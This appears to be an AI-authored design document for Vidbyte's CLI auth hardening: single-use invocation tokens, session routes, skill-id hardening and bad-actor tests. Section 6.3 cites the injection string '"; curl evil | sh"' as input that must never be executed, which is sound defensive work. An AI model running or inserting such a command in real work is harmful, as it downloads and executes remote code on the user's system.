# Design Doc: CLI Backend Auth Hardening

**Status:** Draft
**Author:** Codex
**Created:** 2026-05-21
**Last Updated:** 2026-05-21

---

## 1. Overview

Harden Vidbyte skill submissions so AI-agent prompts can produce content, but cannot become the trust boundary for backend writes. The change replaces reusable skill-secret submissions with session-backed, short-lived, single-use invocation tokens, adds bad-actor contract tests across the CLI and backend, fixes current CLI/backend auth contract drift, and removes prompt-visible direct `curl`/header construction patterns from installed skills.

---

## 2. Goals & Non-Goals

### Goals

- Add tests that simulate bad actors abusing prompt-visible CLI commands, copied headers, replayed requests, stolen/static secrets, skill-id spoofing, automated floods, and argument-injection payloads.
- Require authenticated CLI sessions before skill write endpoints accept submissions.
- Add `POST /api/skills/auth/invoke` to mint short-lived, single-use invocation tokens bound to the session, installation, method, path, skill id, body hash, and request nonce.
- Make write-route middleware verify and atomically consume invocation tokens before payload persistence.
- Preserve existing payload validation, bot scoring, replay protection, IP intelligence, circuit breaker, and audit behavior.
- Fix CLI/backend contract drift: auth validate path, API-key header, response field names, compression endpoint name, nonce format, and signature encoding during migration.
- Stop shipping skills that instruct agents to construct Vidbyte auth headers or call Vidbyte backend endpoints with `curl`.
- Keep local and CI verification lightweight enough to run in the existing repo test style.

### Non-Goals

- Full OAuth PKCE/device-code replacement for the current API-key bootstrap flow. The design leaves room for PKCE later, but this PR will not add an OAuth provider integration that does not currently exist in the codebase.
- Solving all bot traffic at the network edge. The backend will add installation-level abuse controls; CDN/WAF JA4/TLS fingerprinting remains an infrastructure follow-up.
- Making local agent execution sandboxed. The CLI can avoid shell interpolation and dangerous prompt contracts, but the coding harness sandbox is outside this repo.
- Replacing every installed skill unrelated to backend submissions.

---

## 3. Background & Context

The current `vidbyte-cli` repo exposes backend-bound skill commands through Python CLI code wrapped by a Node bin shim. The prompt layer is documented as non-authoritative in `artifacts/skill-cli-backend-architecture.md`, but some shipped `SKILL.md` files still show direct `curl` and `X-Skill-*` header construction. The CLI currently signs request bodies with `VIDBYTE_SKILL_SECRET` and sends static HMAC headers.

The backend source was not present in the checked-out `vidbyte` branch at `C:\Users\422mi\vidbyte-repos\vidbyte`; that checkout is on `feat/prompt-api-strategies-sdk` and mostly tracks SDK files. The backend audit therefore used `C:\Users\422mi\vidbyte-repos\worktrees\feat-sidebar-redesign`, which contains FastAPI `backend/` source and the existing skills middleware/tests. A follow-up branch audit confirmed `origin/main` in the `vidbyte` repository contains the product `backend/`, `next-app/`, and `docs/` trees, and the audited skills files in `feat/sidebar-redesign` match `origin/main` for the paths this design touches. Phase 3 should therefore create the backend implementation worktree from `origin/main`, not from the current SDK-oriented checkout branch.

Current backend skills middleware already has useful layers: CORS enforcement, body size/type checks, HMAC verification, nonce replay protection, IP intelligence, per-IP and global rate limits, schema validation, prompt-injection detection, bot/anomaly scoring, circuit breaker, and audit logging. The main gap is the authority model: write requests are accepted from any caller with a valid reusable skill secret. If an agent prompt, skill file, CI log, `.env`, or host process leaks that secret or a signed request, the backend has no user/session-level control beyond rate limits and nonce windows.

The cited research points in the same direction:

- Logto recommends browser OAuth with PKCE for local developer CLIs, device flow only as fallback, and refresh-token rotation for limiting stolen token lifetime: https://blog.logto.io/cli-authentication-methods
- WorkOS calls out environment variable risks for end-user CLIs and recommends minimizing credential lifetime: https://workos.com/guide/best-practices-for-cli-authentication-a-technical-guide
- Trail of Bits shows prompt-to-command and argument-injection failures are architectural, and recommends sandboxing or strict facade-style execution with argument separation: https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/
- Vercel documents automated access patterns built around per-system secrets/trusted sources, and its firewall work shows why IP-only controls are not enough: https://vercel.com/docs/deployment-protection/automated-agent-access and https://vercel.com/blog/protecting-your-app-and-wallet-against-malicious-traffic
- HashiCorp Vault TTL guidance reinforces short-lived credentials as the default risk-reduction pattern: https://developer.hashicorp.com/vault/docs/troubleshoot/tune-lease-ttl

---

## 4. Requirements

### Functional Requirements

1. `vidbyte-skills auth login` must authenticate against the backend contract that exists today: `POST /api/skills/auth/validate` with `X-Api-Key`.
2. Auth validation must store the backend `session_token` as the local CLI session token and must not persist raw API keys.
3. `GET /api/skills/auth/session` and `DELETE /api/skills/auth/session` must support CLI status/logout with bearer session tokens.
4. Skill write commands must build the final JSON body locally, compute its SHA-256 hash, and request an invocation token before sending the write.
5. `POST /api/skills/auth/invoke` must require a valid CLI session token.
6. Invocation tokens must be opaque, high-entropy, TTL-bound, single-use, and stored server-side by hash.
7. Invocation token records must bind at minimum: `session_token_hash`, `user_id`, `installation_id`, `skill_id`, `method`, `path`, `body_sha256`, `request_nonce`, `created_at`, `expires_at`, `consumed_at`, and `client_ip_hash`.
8. The CLI must send the invocation token on the actual skill write using `Authorization: Bearer <token>` plus non-secret metadata headers.
9. The backend write middleware must reject missing, unknown, expired, consumed, body-mismatched, path-mismatched, skill-mismatched, installation-mismatched, and session-revoked invocation tokens.
10. Token consumption must be atomic so concurrent replay of the same token accepts at most one request.
11. Legacy static HMAC skill-secret auth must be disabled by default for production-like environments, with an explicit temporary compatibility flag for local migration if needed.
12. Installation-level velocity limits must apply in addition to IP limits.
13. Skill id must come from the command implementation or server authorization, not arbitrary prompt-provided `--skill-id` overrides for protected commands.
14. CLI commands must never construct shell command strings from user/model text.
15. Skill prompts must instruct agents to call the Vidbyte CLI only, not to construct headers or call backend endpoints directly.
16. Error messages and dry-run output must not reveal tokens, API keys, raw signatures, or raw secrets.

### Non-Functional Requirements

- Security: fail closed for write endpoints when invocation-token validation cannot run.
- Performance: invocation token mint/consume should add one backend round trip and one indexed database update per write; expected CLI writes are low-volume and human-paced.
- Scalability: velocity limits must key by installation/session as well as IP so proxy rotation does not bypass all controls.
- Observability: audit logs should include request id, token outcome, installation hash, user id hash, skill id, endpoint, body hash, rate-limit outcome, and rejection code without storing raw tokens or prompt text.
- Reliability: if token mint succeeds but write fails transiently before reaching middleware, the user can retry by minting a fresh token; consumed tokens are never reused.

---

## 5. High-Level Design

The CLI remains the first client-side enforcement point, but it stops being an authority that can sign arbitrary writes forever. It authenticates once with an API key, stores an account-linked session token, and then mints a one-use invocation token for each skill write. The prompt can still call `vidbyte retain ...` or `vidbyte feedback submit ...`, but the server decides whether that installation/session may perform that exact write.

The backend adds an auth-invoke route and a token repository. Write-route middleware changes from "verify static HMAC then process" to "verify invocation token then process." Existing replay, rate, payload, bot, circuit, and audit layers remain in the stack. HMAC code can remain temporarily for local/backward compatibility behind `VIDBYTE_SKILLS_ALLOW_LEGACY_HMAC`, but tests will assert that production default rejects static-secret-only writes.

```text
Agent prompt
  -> vidbyte CLI command
  -> build/validate JSON body
  -> POST /api/skills/auth/invoke with session token + body hash + path + install id
  -> backend stores invocation token hash with 60s TTL and bound claims
  -> CLI POST /api/skills/<skill> with Authorization: Bearer invocation token
  -> backend atomically consumes token, then runs existing payload/security stack
  -> persistence + audit
```

---

## 6. Detailed Design

### 6.1 CLI Endpoint And Auth Contract Fixes

**File(s):** `vidbyte-cli/cli/client.py`, `vidbyte-cli/cli/commands/auth.py`, `vidbyte-cli/cli/auth/session.py`, `vidbyte-cli/cli/constants/auth.py`
**Type:** Modified

#### What it does

Aligns the CLI with the backend auth contract and prepares the request builder for invocation-token writes.

#### Interface / API

```python
ENDPOINTS = {
    "feedback": "/api/skills/feedback",
    "compressor": "/api/skills/compression",
    "retain": "/api/skills/retain",
    "auth-validate": "/api/skills/auth/validate",
    "auth-invoke": "/api/skills/auth/invoke",
    "auth-session": "/api/skills/auth/session",
}
```

#### Logic / Algorithm

1. Change `auth-validate` to `/api/skills/auth/validate`.
2. Send API keys as `X-Api-Key`, not `Authorization: Bearer`.
3. Read backend response fields `session_token`, `username`, `email`, `account_tier`.
4. Store only `session_token` and public account metadata.
5. Improve error parsing to prefer `message`/`code` over the boolean `error` field.
6. Keep `OFFICIAL_API_ORIGIN` as the only production origin.

#### Edge Cases & Error Handling

- Non-interactive auth continues to read `VIDBYTE_API_KEY` only for `auth login`; raw API keys are never stored.
- If stored credentials are malformed, treat the CLI as unauthenticated.
- If backend returns 401/403, clear stale session only for session-token paths, not for failed API-key login.

### 6.2 CLI Invocation Token Client

**File(s):** `vidbyte-cli/cli/auth/invocation.py`, `vidbyte-cli/cli/client.py`
**Type:** New file, Modified

#### What it does

Adds a small invocation-token client that mints a token for an exact outbound write and attaches it to the final request.

#### Interface / API

```python
@dataclass(frozen=True)
class InvocationRequest:
    method: str
    path: str
    skill_id: str
    body_sha256: str
    request_nonce: str
    installation_id: str

def get_or_create_installation_id(session: CredentialsSession) -> str: ...
def request_invocation_token(session_token: str, request: InvocationRequest, cli_version: str) -> str: ...
```

#### Logic / Algorithm

1. Compute stable local `installation_id` on first use and store it alongside credentials with file permissions matching current session storage.
2. For each skill write, serialize the exact body once and hash that exact string.
3. Generate a UUID `request_nonce`.
4. Call `auth-invoke` with session token and bound request metadata.
5. Build final skill request using `Authorization: Bearer <invocation_token>`, `X-Vidbyte-Installation-Id`, `X-Skill-Id`, `X-Skill-Body-SHA256`, `X-Skill-Request-Nonce`, `X-Vidbyte-CLI-Version`, and `Content-Type`.

#### Edge Cases & Error Handling

- Missing session token causes a clear "run vidbyte-skills auth login" error before any skill write.
- Expired session returns an auth error and instructs re-login.
- Dry-run output may include header names and body hash, but never token values.

### 6.3 CLI Argument And Skill-Id Hardening

**File(s):** `vidbyte-cli/cli/commands/retain.py`, `vidbyte-cli/cli/dataclasses/retain.py`, `vidbyte-cli/cli/commands/feedback.py`, `vidbyte-cli/cli/commands/compressor.py`
**Type:** Modified

#### What it does

Reduces prompt-driven privilege shaping and argument-injection surface.

#### Interface / API

```python
PROTECTED_SKILL_IDS = {
    "feedback": "feedback",
    "compressor": "compression",
    "retain": "retain",
}
```

#### Logic / Algorithm

1. Remove or ignore prompt-provided `--skill-id` for backend write commands unless a local development environment variable explicitly enables overrides.
2. Validate string fields as data, not command fragments.
3. Keep subprocess usage as argv arrays only; do not introduce `shell=True`.
4. Prefer file/stdin payload input in skills that need large free-form text.

#### Edge Cases & Error Handling

- Existing skill prompts that pass `--skill-id` should continue during migration only if the expected protected id matches the command.
- Malicious values like `"; curl evil | sh"` remain text fields or are rejected by schema/sanitizer, never interpreted.

### 6.4 Backend Invocation Token DTOs And Persistence

**File(s):** `vidbyte/backend/lib/dtos/skills.py`, `vidbyte/backend/lib/enums/skills.py`, `vidbyte/backend/database/queries/skills.py`, `vidbyte/backend/lib/config/skills.py`
**Type:** Modified

#### What it does

Defines and stores short-lived invocation token documents.

#### Interface / API

```python
class SkillInvocationDocumentDto(BaseModel):
    token_hash: str
    session_token_hash: str
    user_id: str
    installation_id_hash: str
    skill_id: str
    method: str
    path: str
    body_sha256: str
    request_nonce: str
    client_ip_hash: str
    created_at: datetime
    expires_at: datetime
    consumed_at: datetime | None = None
    schema_version: Literal["skills.invocation.v1"]
```

#### Logic / Algorithm

1. Add `INVOCATIONS = "skillinvocations"` to `SkillDatabaseCollection`.
2. Add `INVOCATION_TTL_SECONDS = 60`, `INSTALLATION_MINUTE_LIMIT`, and `INSTALLATION_HOUR_LIMIT` config constants.
3. Store only hashes of tokens, sessions, installation ids, and IPs.
4. Ensure indexes on `token_hash`, `expires_at`, `session_token_hash`, `installation_id_hash`, and `request_nonce`.
5. Implement `create_skill_invocation`, `consume_skill_invocation`, and installation velocity helpers.

#### Edge Cases & Error Handling

- Token creation fails closed with a 500 and audit event if persistence is unavailable.
- Consume uses an atomic `find_one_and_update` requiring `consumed_at is None` and `expires_at > now`.

### 6.5 Backend Auth Invoke Route

**File(s):** `vidbyte/backend/routes/skills.py`, `vidbyte/backend/middleware/skills.py`
**Type:** Modified

#### What it does

Adds the route used by the CLI to mint invocation tokens for exact writes.

#### Interface / API

```http
POST /api/skills/auth/invoke
Authorization: Bearer <session_token>
Content-Type: application/json
```

```json
{
  "skill_id": "retain",
  "method": "POST",
  "path": "/api/skills/retain",
  "body_sha256": "hex sha256",
  "request_nonce": "uuid",
  "installation_id": "uuid"
}
```

```json
{
  "success": true,
  "invocation_token": "opaque token",
  "expires_in": 60
}
```

#### Logic / Algorithm

1. Middleware applies CORS, IP intelligence, auth/session rate limits, installation velocity limits, and circuit breaker.
2. Route validates bearer session using existing `get_skill_session`.
3. Route validates path/method/skill combinations against an allowlist.
4. Route rejects unknown skill ids and mismatched endpoint bindings.
5. Route stores a token hash and returns the raw token once.

#### Edge Cases & Error Handling

| Status | Condition |
|--------|-----------|
| 400 | Invalid request shape, invalid UUID, invalid body hash |
| 401 | Missing, unknown, expired, or revoked session |
| 403 | Skill/path mismatch or skill not authorized |
| 429 | Session or installation velocity limit exceeded |
| 500 | Token persistence unavailable |

### 6.6 Backend Auth Session Routes

**File(s):** `vidbyte/backend/routes/skills.py`, `vidbyte/backend/middleware/skills.py`
**Type:** Modified

#### What it does

Adds session inspect and revoke routes that match the CLI's existing status/logout command shape.

#### Interface / API

```http
GET /api/skills/auth/session
Authorization: Bearer <session_token>
```

```http
DELETE /api/skills/auth/session
Authorization: Bearer <session_token>
```

#### Logic / Algorithm

1. Middleware applies CORS, IP intelligence, auth/session rate limits, and circuit breaker.
2. `GET` resolves the bearer session with `get_skill_session`, rejects expired sessions, and returns public account metadata.
3. `DELETE` resolves the bearer session and deletes it with `delete_skill_session`.
4. Both routes avoid returning raw session token values.

#### Edge Cases & Error Handling

- Missing bearer token: `401 MISSING_SESSION_TOKEN`.
- Unknown or expired token: `401 INVALID_SESSION`.
- Delete of an already-missing session is idempotent from the CLI perspective and returns 204 or a success body.

### 6.7 Backend Write Middleware Token Verification

**File(s):** `vidbyte/backend/lib/middleware/skills_security.py`, `vidbyte/backend/middleware/skills.py`, `vidbyte/backend/lib/middleware/skills_requests.py`
**Type:** Modified

#### What it does

Changes write-route auth from reusable HMAC verification to invocation-token verification.

#### Interface / API

```python
class SkillsInvocationVerifier:
    async def verify_invocation_token(self, request: Request, raw_body: bytes) -> Response | None: ...
```

#### Logic / Algorithm

1. Extract `Authorization: Bearer <invocation_token>`.
2. Hash token and look up an unconsumed, unexpired invocation document.
3. Recompute raw-body SHA-256 and compare against the invocation document and `X-Skill-Body-SHA256`.
4. Compare request method/path/skill id/request nonce/installation id against the stored document.
5. Atomically mark the token consumed before route handling.
6. Populate `request.state.user_id`, `request.state.skill_id`, `request.state.installation_id_hash`, and `request.state.invocation_token_hash`.
7. Continue through existing replay, IP, rate, payload, bot, circuit, and audit layers.

#### Edge Cases & Error Handling

- Missing token: `401 MISSING_INVOCATION_TOKEN`.
- Reused token: `401 INVOCATION_TOKEN_CONSUMED`.
- Expired token: `401 INVOCATION_TOKEN_EXPIRED`.
- Body/path/skill mismatch: `401 INVALID_INVOCATION_TOKEN`.
- If `VIDBYTE_SKILLS_ALLOW_LEGACY_HMAC=true`, fallback to existing HMAC verifier only for local/staging migration; production config defaults false.

### 6.8 Skill Prompt Cleanup

**File(s):** `vidbyte-cli/skills/daily-review/SKILL.md`, `vidbyte-cli/skills/misconceptions/SKILL.md`, `vidbyte-cli/skills/feedback-generator/SKILL.md`, `vidbyte-cli/skills/compression-check/SKILL.md`, `vidbyte-cli/skills/retain/SKILL.md`, `vidbyte-cli/artifacts/create-skill-guide.md`, `vidbyte-cli/README.md`
**Type:** Modified

#### What it does

Removes instructions that teach agents how to bypass the CLI boundary or construct Vidbyte auth headers.

#### Interface / API

N/A - Markdown skill and documentation changes only.

#### Logic / Algorithm

1. Replace direct `curl` snippets with CLI calls.
2. State that prompts must not construct auth headers, signatures, backend URLs, or raw HTTP requests.
3. Keep examples using local files and `vidbyte ... --file`.
4. Update docs from "static HMAC secret" to "authenticated session plus per-invocation token."

#### Edge Cases & Error Handling

- Skills that are not backend-bound keep "do not call external services" language.
- Any skill that cannot yet map to an existing CLI command is listed as an implementation blocker before rollout.

### 6.9 Test Harness Changes

**File(s):** `vidbyte-cli/scripts/cli-security-test.py`, `vidbyte-cli/scripts/cli-security-test.js`, `vidbyte-cli/package.json`, backend tests listed below
**Type:** New files, Modified

#### What it does

Adds red-team/security-contract tests to make abuse cases executable.

#### Interface / API

N/A - test-only scripts and pytest modules.

#### Logic / Algorithm

1. Add CLI tests using only stdlib subprocess/tempfile patterns already used by `cli-smoke-test.py`.
2. Add backend pytest modules under `backend/tests/skills/security_abuse`.
3. Use mocked DB/query functions where existing skills tests already do so.
4. Assert "bad actor" requests are rejected and legitimate session-backed CLI flow succeeds.

#### Edge Cases & Error Handling

- Tests should avoid real network calls.
- Tests should reset middleware global state between scenarios as existing tests do.

---

## 7. Data Model Changes

### 7.1 `skillinvocations`

**Change type:** New

```json
{
  "token_hash": "string",
  "session_token_hash": "string",
  "user_id": "string",
  "installation_id_hash": "string",
  "skill_id": "string",
  "method": "POST",
  "path": "/api/skills/retain",
  "body_sha256": "hex sha256",
  "request_nonce": "uuid",
  "client_ip_hash": "string",
  "created_at": "datetime",
  "expires_at": "datetime",
  "consumed_at": "datetime|null",
  "schema_version": "skills.invocation.v1"
}
```

**Migration strategy:** 

- Forward migration: add enum value and lazy index creation through existing `DatabaseIndexManager`.
- Rollback plan: deploy code that stops writing invocation docs, then optionally drop the collection after TTL expiry.

### 7.2 `skillsessions`

**Change type:** Modified

```json
{
  "session_token": "existing opaque token",
  "user_id": "existing",
  "username": "existing",
  "email": "existing",
  "account_tier": "existing",
  "api_key_prefix": "existing",
  "revoked_at": "datetime|null - optional future-compatible field"
}
```

**Migration strategy:** 

- Forward migration: no hard migration required if `revoked_at` is optional.
- Rollback plan: ignore `revoked_at` if present.

---

## 8. API Changes

### 8.1 POST /api/skills/auth/validate

**Change type:** Modified

**Request:**

```json
{}
```

Header: `X-Api-Key: vb_live_...`

**Response:**

```json
{
  "success": true,
  "session_token": "opaque string",
  "username": "string",
  "email": "string",
  "account_tier": "string"
}
```

**Error cases:**

| Status | Condition |
|--------|-----------|
| 400 | Missing or malformed API key |
| 401 | Unknown, revoked, disabled, or expired key |
| 429 | Auth rate limit exceeded |
| 500 | Auth persistence/internal error |

### 8.2 GET /api/skills/auth/session

**Change type:** New

**Request:**

```json
{}
```

Header: `Authorization: Bearer <session_token>`

**Response:**

```json
{
  "success": true,
  "username": "string",
  "email": "string",
  "account_tier": "string",
  "expires_at": "datetime"
}
```

**Error cases:**

| Status | Condition |
|--------|-----------|
| 401 | Missing, invalid, or expired session |
| 429 | Auth/session rate limit exceeded |
| 500 | Session lookup/internal error |

### 8.3 DELETE /api/skills/auth/session

**Change type:** New

**Request:**

```json
{}
```

Header: `Authorization: Bearer <session_token>`

**Response:**

```json
{
  "success": true
}
```

**Error cases:**

| Status | Condition |
|--------|-----------|
| 401 | Missing or invalid session |
| 429 | Auth/session rate limit exceeded |
| 500 | Session delete/internal error |

### 8.4 POST /api/skills/auth/invoke

**Change type:** New

**Request:**

```json
{
  "skill_id": "retain",
  "method": "POST",
  "path": "/api/skills/retain",
  "body_sha256": "hex sha256",
  "request_nonce": "uuid",
  "installation_id": "uuid"
}
```

**Response:**

```json
{
  "success": true,
  "invocation_token": "opaque string",
  "expires_in": 60
}
```

**Error cases:**

| Status | Condition |
|--------|-----------|
| 400 | Invalid shape, body hash, nonce, method, or path |
| 401 | Missing/invalid/expired session |
| 403 | Unauthorized skill/path binding |
| 429 | Session or installation velocity limit exceeded |
| 500 | Token persistence/internal error |

### 8.5 POST /api/skills/learning, /compression, /feedback, /retain

**Change type:** Modified

**Request:**

Existing JSON payloads, plus:

```http
Authorization: Bearer <invocation_token>
X-Skill-Id: retain
X-Skill-Body-SHA256: <hex sha256>
X-Skill-Request-Nonce: <uuid>
X-Vidbyte-Installation-Id: <uuid>
X-Vidbyte-CLI-Version: <version>
```

**Response:**

Existing success responses unchanged.

**Error cases:**

| Status | Condition |
|--------|-----------|
| 401 | Missing, invalid, expired, consumed, or mismatched invocation token |
| 400 | Existing schema/prompt-injection validation failures |
| 403 | Existing bot/IP/threat rejection |
| 429 | Existing IP/global limits or new installation limits |
| 500 | Existing persistence/internal errors |

---

## 9. File Change Manifest

Complete list of every file that will be created, modified, or deleted:

| Action | File Path | Reason |
|--------|-----------|--------|
| CREATE | `vidbyte-cli/docs/design/cli-backend-auth-hardening.md` | This design doc |
| CREATE | `vidbyte-cli/cli/auth/invocation.py` | Invocation token client and installation id helper |
| CREATE | `vidbyte-cli/scripts/cli-security-test.py` | CLI bad-actor contract tests |
| CREATE | `vidbyte-cli/scripts/cli-security-test.js` | Node wrapper for npm test parity |
| MODIFY | `vidbyte-cli/package.json` | Add CLI security test to `npm test` |
| MODIFY | `vidbyte-cli/cli/client.py` | Endpoint fixes and invocation-token request building |
| MODIFY | `vidbyte-cli/cli/commands/auth.py` | Use `X-Api-Key`, backend path, and response field contract |
| MODIFY | `vidbyte-cli/cli/auth/session.py` | Store session token and installation id safely |
| MODIFY | `vidbyte-cli/cli/constants/auth.py` | Auth constants and protected skill ids |
| MODIFY | `vidbyte-cli/cli/commands/retain.py` | Remove prompt-controlled skill-id authority and harden input |
| MODIFY | `vidbyte-cli/cli/dataclasses/retain.py` | Remove `skill-id` from normal allowed attacker-controlled options |
| MODIFY | `vidbyte-cli/cli/commands/feedback.py` | Use invocation-token flow |
| MODIFY | `vidbyte-cli/cli/commands/compressor.py` | Use invocation-token flow and corrected compression path |
| MODIFY | `vidbyte-cli/scripts/cli-smoke-test.py` | Update dry-run expectations from HMAC headers to invocation-token headers |
| MODIFY | `vidbyte-cli/README.md` | Document session/invocation-token auth model |
| MODIFY | `vidbyte-cli/.env.example` | Remove static production skill-secret guidance |
| MODIFY | `vidbyte-cli/artifacts/create-skill-guide.md` | Update backend-bound skill security guidance |
| MODIFY | `vidbyte-cli/artifacts/skill-cli-backend-architecture.md` | Update architecture from static HMAC to invocation tokens |
| MODIFY | `vidbyte-cli/skills/daily-review/SKILL.md` | Remove direct curl/header construction |
| MODIFY | `vidbyte-cli/skills/misconceptions/SKILL.md` | Remove direct curl/header construction |
| MODIFY | `vidbyte-cli/skills/feedback-generator/SKILL.md` | Clarify CLI-only submission boundary |
| MODIFY | `vidbyte-cli/skills/compression-check/SKILL.md` | Clarify CLI-only submission boundary |
| MODIFY | `vidbyte-cli/skills/retain/SKILL.md` | Remove prompt-controlled skill-id authority |
| CREATE | `vidbyte/backend/tests/skills/security_abuse/__init__.py` | Security abuse test package |
| CREATE | `vidbyte/backend/tests/skills/security_abuse/test_skill_invocation_tokens.py` | Token mint/consume/replay/mismatch tests |
| CREATE | `vidbyte/backend/tests/skills/security_abuse/test_skill_automation_abuse.py` | Installation velocity and direct automation tests |
| CREATE | `vidbyte/backend/tests/skills/security_abuse/test_skill_legacy_hmac_rejection.py` | Static-secret default rejection tests |
| CREATE | `vidbyte/backend/tests/skills/security_abuse/test_skill_session_contract.py` | Session auth/invoke contract tests |
| MODIFY | `vidbyte/backend/lib/config/skills.py` | Invocation token constants and auth-invoke path |
| MODIFY | `vidbyte/backend/lib/dtos/skills.py` | Invocation request/document DTOs |
| MODIFY | `vidbyte/backend/lib/enums/skills.py` | Add invocation collection and auth-invoke public route |
| MODIFY | `vidbyte/backend/database/queries/skills.py` | Invocation token persistence and atomic consume |
| MODIFY | `vidbyte/backend/routes/skills.py` | Add auth-invoke route and session validation helpers |
| MODIFY | `vidbyte/backend/middleware/skills.py` | Dispatch auth-invoke and replace write auth layer |
| MODIFY | `vidbyte/backend/lib/middleware/skills_security.py` | Invocation verifier and legacy HMAC flag |
| MODIFY | `vidbyte/backend/lib/middleware/skills_requests.py` | Header allowances and request metadata helpers |
| MODIFY | `vidbyte/backend/tests/skills/test_auth_validate.py` | Update/extend auth contract coverage |
| MODIFY | `vidbyte/backend/tests/skills/test_skills_public_endpoint.py` | Update success path to invocation-token auth |
| DELETE | N/A | No planned deletions |

Manifest counts: create 9, modify 31, delete 0.

---

## 10. Testing Plan

### Unit Tests

- `cli-security-test.py` -> rejects missing session for skill writes.
- `cli-security-test.py` -> auth login sends `X-Api-Key` and stores `session_token`, not raw API key.
- `cli-security-test.py` -> dry-run output contains no API key, session token, invocation token, HMAC secret, or signature.
- `cli-security-test.py` -> malicious text containing shell metacharacters is serialized as JSON data and never executed.
- `cli-security-test.py` -> prompt-provided `--skill-id` cannot change the protected backend skill identity.
- `test_skill_invocation_tokens.py` -> mint invocation token for valid session and exact body/path/skill binding.
- `test_skill_invocation_tokens.py` -> reject reused token.
- `test_skill_invocation_tokens.py` -> reject expired token.
- `test_skill_invocation_tokens.py` -> reject body hash mismatch.
- `test_skill_invocation_tokens.py` -> reject path/method mismatch.
- `test_skill_invocation_tokens.py` -> reject installation id mismatch.
- `test_skill_invocation_tokens.py` -> concurrent consume accepts only one caller.
- `test_skill_session_contract.py` -> reject missing, invalid, expired, revoked session on auth-invoke.
- `test_skill_session_contract.py` -> status returns public metadata and never returns the raw session token.
- `test_skill_session_contract.py` -> logout deletes the session and subsequent auth-invoke fails.
- `test_skill_legacy_hmac_rejection.py` -> static HMAC-only write is rejected by default.
- `test_skill_legacy_hmac_rejection.py` -> legacy HMAC works only when explicit compatibility flag is enabled.
- `test_skill_automation_abuse.py` -> repeated requests from same installation hit installation-level limiter even if IP changes.
- `test_skill_automation_abuse.py` -> low-entropy high-frequency payloads remain blocked by existing threat scoring.

### Integration Tests

- Auth validate -> auth invoke -> write retain item succeeds with mocked DB.
- Auth validate -> auth invoke -> write feedback item succeeds with mocked DB.
- Auth validate -> auth invoke -> write compression item succeeds with mocked DB.
- Auth validate -> auth invoke -> write learning module succeeds with mocked DB.
- Direct `curl` style write with copied `X-Skill-*` headers fails when legacy flag is off.
- Existing public read routes remain readable and continue to validate id format.

### Manual / QA Test Cases

1. Given a valid API key, when running `vidbyte-skills auth login`, then credentials contain a session token and installation id but no raw API key.
2. Given an authenticated CLI, when running `vidbyte retain ...`, then the backend creates a retain item and the CLI prints the existing success output.
3. Given no credentials, when running a backend-bound command, then the CLI fails before sending a write and tells the user to authenticate.
4. Given a copied invocation token, when replaying the same HTTP write twice, then the second write returns 401.
5. Given a modified JSON body after token mint, when sending the write, then the backend returns 401.
6. Given a skill prompt containing direct `curl` instructions, when running repo validation, then validation or security tests fail.

---

## 11. Dependencies & External Services

| Dependency | Version / Endpoint | Purpose | Risk |
|------------|--------------------|---------|------|
| Existing Python stdlib | Python used by CLI | Token client, hashing, UUID, urllib | Keeps CLI dependency-free but does not provide OS keychain |
| Existing FastAPI backend | Current backend stack | New route and middleware verification | Must target correct backend worktree/base |
| Existing MongoDB via Motor | Existing DB dependency | Invocation token persistence | Write path depends on DB availability |
| Vidbyte production API | `https://vidbyte.pro` | CLI backend target | Endpoint rollout must be coordinated with CLI release |
| Future OS keychain | TBD | Better local credential storage | Not included in first PR because CLI currently has no Python dependency system |

---

## 12. Rollout & Deployment

- Add backend support first with legacy HMAC compatibility enabled only in staging/local.
- Release CLI that logs in through `/api/skills/auth/validate` and writes through `/api/skills/auth/invoke`.
- Update skill prompts/docs to remove direct HTTP/header instructions.
- Run backend security-abuse tests and CLI security tests in CI.
- Disable legacy HMAC fallback in production after the CLI release has propagated.
- Rollback procedure: re-enable `VIDBYTE_SKILLS_ALLOW_LEGACY_HMAC=true` temporarily and redeploy the previous CLI package if invocation-token writes fail unexpectedly.

---

## 13. Open Questions

- [x] Which Vidbyte backend branch should Phase 3 target? Use a fresh `vidbyte` worktree from `origin/main`; the checked-out repo is on an SDK-oriented feature branch, but `origin/main` contains the backend tree and matches the audited skills files for the relevant paths.
- [ ] Should CLI local credential storage remain chmod-protected JSON for this PR, or should we add an OS keychain dependency/adapter now?
- [ ] Should installation fingerprinting be a hard binding or a soft risk signal? Hard device fingerprints are brittle; installation UUID plus velocity controls is safer for first rollout.
- [ ] Are `daily-review` and `misconceptions` supposed to have first-class CLI commands, or should they be rewritten to use existing `retain`/`feedback` commands?
- [ ] Should legacy HMAC fallback exist at all, or should implementation make this a breaking backend/CLI deploy?

---

## 14. Alternatives Considered

### Alternative 1: Keep Static HMAC And Add More Rate Limits

- What: Preserve `VIDBYTE_SKILL_SECRET` writes and add per-skill/IP throttles.
- Why rejected: IP limits do not stop distributed automation, and a leaked static secret remains valid until rotated everywhere.

### Alternative 2: Full OAuth PKCE Before Any Skill Auth Work

- What: Replace API-key login with browser OAuth PKCE first.
- Why rejected: The backend currently has API-key validation and skill sessions. Invocation tokens solve the immediate write-authority problem without blocking on a new OAuth provider integration.

### Alternative 3: Device Code Flow As Default CLI Login

- What: Use device code flow for all CLI logins.
- Why rejected: It helps headless environments, but local developer CLIs with browser access are better served by PKCE when OAuth exists. Current PR keeps API-key bootstrap and does not add a weaker default.

### Alternative 4: Prompt-Level Instructions Only

- What: Tell skills not to call `curl` or expose headers.
- Why rejected: Prompt instructions are not a security boundary. The backend must reject unauthorized writes regardless of prompt behavior.

### Alternative 5: Proof Of Work In First PR

- What: Add hashcash-style challenges before suspicious writes.
- Why rejected: It is a useful later backstop under load, but single-use tokens plus installation velocity limits address the primary auth gap with less client complexity.
